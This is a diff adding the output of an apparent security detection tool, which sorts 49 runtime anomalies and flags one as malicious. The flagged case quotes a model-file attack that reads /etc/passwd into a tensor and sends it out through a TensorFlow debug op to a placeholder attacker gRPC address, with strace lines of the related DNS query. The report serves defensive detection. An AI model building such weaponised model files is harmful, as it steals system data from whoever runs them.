@@ -1,0 +1,18 @@
+================================================================================
+DDMO Fine-grained Verification Results (Two-Stage)
+================================================================================
+Total anomalies: 49
+Final: Malicious=1, Benign=48, Unknown=0
+--------------------------------------------------------------------------------
+
+  [40] IntentScore=10.0 | Model Inference Phase
+  socket -> close
+  Evidence: (1) The syscall anomaly shows a DNS query to a non-standard external server at 1.2.3.4:53, performed via UDP socket, setsockopt, connect, sendmsg, and close. This is a typical hostname resolution step, often preceding an external network connection. (2) The application log contains the APIs __inference___call___177/ImmutableConst with memory_region_name="/etc/passwd", loading the contents of that sensitive file into a tensor, and __inference___call___177/DebugIdentityV3 with tensor_name="leak" and debug_urls=["grpc://<my_attacker_ip>:8080"]. This is an exact match for the File Leak attack pattern: reading a sensitive system file and sending it to an attacker-controlled external destination. (3) The two layers are consistent and complementary: the DNS query likely resolves the hostname embedded in the debug_urls before the actual gRPC exfiltration connection is established by the DebugIdentityV3 API. The presence of legitimate inference operations (MatMul, Relu, Sigmoid) alongside these malicious ops shows the model is weaponized to leak /etc/passwd under the guise of normal inference. (4) Final judgment: Malicious. The system call activity is not isolated; it is directly linked to a clear API-driven attack that reads /etc/passwd and exfiltrates it to an external gRPC endpoint. There is no legitimate framework purpose for ImmutableConst on /etc/passwd and DebugIdentityV3 to an arbitrary external URL during model inference.
+    -> socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 20<UDP:[525807127]>
+    -> setsockopt(20<UDP:[525807127]>, SOL_IP, IP_RECVERR, [1], 4) = 0
+    -> connect(20<UDP:[525807127]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("1.2.3.4")}, 16) = 0
+    -> sendmsg(20<UDP:[127.0.0.1:39624->1.2.3.4:53]>, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_bas) = 2
+    -> close(20<UDP:[127.0.0.1:39624->1.2.3.4:53]>) = 0
+
+================================================================================
+Summary | Malicious=1 Benign=48 Unknown=0
